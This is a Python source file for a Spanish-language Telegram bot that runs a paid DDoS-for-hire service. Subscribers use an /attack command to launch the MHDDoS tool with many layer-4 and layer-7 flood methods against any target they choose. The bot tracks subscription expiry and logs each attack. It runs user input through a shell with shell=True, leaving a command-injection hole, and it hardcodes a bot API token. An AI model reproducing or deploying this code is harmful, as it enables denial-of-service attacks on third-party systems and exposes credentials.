import telebot
import subprocess
import requests
import os
from datetime import datetime, timedelta
import sqlite3
import psutil

# Reemplaza con tu propio token de bot de Telegram
API_TOKEN = '6623354999:AAGk0m62dSJTYegCAvC--DeajefaTytfnbM'
bot = telebot.TeleBot(API_TOKEN)

# ID del administrador para notificar errores
ADMIN_ID = 5139305942  # Reemplaza con el ID de administrador

# IDs de grupos permitidos (números negativos para grupos)
ALLOWED_GROUPS = [-2160033459]  # Reemplaza con los IDs de grupos permitidos

# Métodos L4 y L7
L4_METHODS = {
    'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR',
    'MINECRAFT', 'MCBOT', 'TCP'
}

L7_METHODS = {
    'COOKIE', 'BYPASS', 'OVH', 'DGB', 'STRESS', 'DOWNLOADER', 'NULL', 'AVB',
    'GET', 'CFB', 'POST', 'EVEN', 'DYN', 'GSB', 'XMLRPC', 'SLOW', 'BOT', 'PPS',
    'CFBUAM', 'APACHE KILLER', 'RHEX', 'STOMP'
}

# Ruta de la base de datos de usuarios
USER_DB_PATH = 'users.db'

# Ruta de la base de datos de ataques
ATTACK_DB_PATH = 'attacks.db'

# Crear la base de datos de usuarios
def create_user_db():
    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                expiration_date TEXT
            )
        ''')
        conn.commit()

# Crear la base de datos de ataques
def create_attack_db():
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                user_id INTEGER,
                metodo TEXT,
                objetivo TEXT,
                tiempo INTEGER,
                start_time TEXT,
                end_time TEXT,
                PRIMARY KEY (user_id, metodo, objetivo, start_time)
            )
        ''')
        conn.commit()

create_user_db()
create_attack_db()

# Función para añadir un usuario con duración específica
def add_user(user_id, duration_type):
    now = datetime.now()
    expiration_date = None
    
    if duration_type == 1:
        expiration_date = now + timedelta(weeks=1)
    elif duration_type == 2:
        expiration_date = now + timedelta(weeks=4)
    elif duration_type == 3:
        expiration_date = now + timedelta(weeks=52)
    elif duration_type == 99:
        expiration_date = None  # Sin expiración

    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        
        if row:
            existing_expiration = row[0]
            if existing_expiration and existing_expiration != 'None':
                existing_expiration = datetime.fromisoformat(existing_expiration)
                if expiration_date and expiration_date > existing_expiration:
                    expiration_date = existing_expiration
        else:
            expiration_date = expiration_date

        cursor.execute('''
            INSERT INTO users (user_id, expiration_date)
            VALUES (?, ?)
            ON CONFLICT(user_id) DO UPDATE SET expiration_date = ?
        ''', (user_id, expiration_date.isoformat() if expiration_date else None, expiration_date.isoformat() if expiration_date else None))
        conn.commit()

def is_user_allowed(user_id):
    if user_id == ADMIN_ID:
        return True

    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        if row:
            expiration_date = row[0]
            if expiration_date:
                if expiration_date == 'None' or datetime.fromisoformat(expiration_date) > datetime.now():
                    return True
                else:
                    cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                    conn.commit()
                    return False
            else:
                return True
        else:
            return False

# Función para obtener el tiempo restante de un usuario
def get_user_info(user_id):
    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        if row:
            expiration_date = row[0]
            if expiration_date:
                if expiration_date == 'None':
                    return "Permiso infinito"
                else:
                    expiration_date = datetime.fromisoformat(expiration_date)
                    remaining_time = expiration_date - datetime.now()
                    if remaining_time > timedelta(0):
                        return f"Tiempo restante: {remaining_time}"
                    else:
                        return "Permiso expirado"
            else:
                return "Permiso infinito"
        else:
            return "Usuario no encontrado"

# Función para registrar un ataque en la base de datos
def log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time=None):
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (user_id, metodo, objetivo, tiempo, start_time, end_time)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, metodo, objetivo, tiempo, start_time, end_time))
        conn.commit()

# Función para actualizar el ataque en la base de datos
def update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time):
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE attacks
            SET end_time = ?
            WHERE user_id = ? AND metodo = ? AND objetivo = ? AND tiempo = ? AND start_time = ?
        ''', (end_time, user_id, metodo, objetivo, tiempo, start_time))
        conn.commit()

# Comando para añadir usuarios con tiempo específico
@bot.message_handler(commands=['add'])
def handle_add_user_command(message):
    try:
        user_id = message.from_user.id

        # Solo el administrador puede añadir usuarios
        if user_id != ADMIN_ID:
            bot.reply_to(message, "No tienes permiso para usar este comando.")
            return

        # Extrae el comando del mensaje
        command_text = message.text.replace('/add', '').strip()
        args = command_text.split()

        if len(args) != 2:
            bot.reply_to(message, "Formato incorrecto. Usa: /add id [1|2|3|99]")
            return

        target_user_id = int(args[0])
        duration_type = int(args[1])

        add_user(target_user_id, duration_type)
        bot.reply_to(message, "Usuario añadido o actualizado correctamente.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f'Error al añadir usuario: {str(e)}')
        bot.reply_to(message, "Ocurrió un error al procesar el comando.")

# Comando para obtener información sobre un usuario
@bot.message_handler(commands=['info'])
def handle_info_command(message):
    try:
        user_id = message.from_user.id

        # Solo el administrador puede obtener información
        if user_id != ADMIN_ID:
            bot.reply_to(message, "No tienes permiso para usar este comando.")
            return

        # Extrae el comando del mensaje
        command_text = message.text.replace('/info', '').strip()
        target_user_id = int(command_text)

        info = get_user_info(target_user_id)
        bot.reply_to(message, f"Información del usuario {target_user_id}: {info}")
    except Exception as e:
        bot.send_message(ADMIN_ID, f'Error al obtener información del usuario: {str(e)}')
        bot.reply_to(message, "Ocurrió un error al procesar el comando.")

# Comando para ejecutar el ataque
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Verificar si el usuario está permitido
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "No tienes permiso para usar este bot.")
        return

    # Extrae el comando del mensaje
    command_text = message.text.replace('/attack', '').strip()
    args = command_text.split()

    # Verifica si los argumentos son correctos
    if len(args) != 4:
        bot.reply_to(message, "Formato incorrecto. Usa: /attack metodo objetivo tiempo hilos")
        return

    metodo, objetivo, tiempo, hilos = args

    # Validar número de hilos
    try:
        hilos = int(hilos)
        if hilos <= 0:
            raise ValueError("Número de hilos debe ser positivo.")
    except ValueError as e:
        bot.reply_to(message, f"Error en el número de hilos: {e}")
        return

    # Validar método
    if metodo == 'BOMB':
        bot.reply_to(message, "El método 'BOMB' no está permitido.")
        return

    if metodo not in L4_METHODS and metodo not in L7_METHODS:
        bot.reply_to(message, "Método no listado.")
        return

    # Obtener la memoria disponible
    ram_gb = psutil.virtual_memory().total / (1024 ** 3)  # RAM total en GB
    reserved_ram_mb = 256
    ram_per_thread_mb = 10
    total_ram_mb = ram_gb * 1024
    available_ram_mb = total_ram_mb - reserved_ram_mb
    max_threads = available_ram_mb // ram_per_thread_mb

    # Limitar el número de hilos basado en el entorno
    if hilos > max_threads:
        hilos = max_threads

    # Preparar el comando según el método
    if metodo in L4_METHODS:
        command = f'python3 /path/to/MHDDoS/start.py {metodo} {objetivo} {hilos} {tiempo}'
    elif metodo in L7_METHODS:
        command = f'python3 /path/to/MHDDoS/start.py {metodo} {objetivo} {hilos} 30000 proxy_file 1000 {tiempo}'

    # Registrar el ataque en la base de datos
    start_time = datetime.now().isoformat()
    end_time = (datetime.now() + timedelta(seconds=int(tiempo))).isoformat()
    log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)

    # Notificar que el ataque ha comenzado
    bot.send_message(chat_id, f'¡Ataque en proceso! Método: {metodo}, Objetivo: {objetivo}, Tiempo: {tiempo}, Hilos: {hilos}')

    # Ejecutar el comando en el servidor
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Imprimir la salida del comando en la terminal
        for stdout_line in iter(process.stdout.readline, ""):
            print(stdout_line.strip())
        for stderr_line in iter(process.stderr.readline, ""):
            print(stderr_line.strip())

        process.stdout.close()
        process.stderr.close()
        process.wait()

        # Actualizar el ataque en la base de datos
        update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)

        # Notificar que el ataque ha finalizado
        bot.send_message(chat_id, "¡Ataque finalizado!")

    except Exception as e:
        bot.send_message(chat_id, f'Ocurrió un error al ejecutar el comando: {e}')
        bot.send_message(ADMIN_ID, f'Ocurrió un error al ejecutar el comando: {e}')
        print(f'Ocurrió un error al ejecutar el comando: {str(e)}')

# Iniciar el bot
bot.polling()
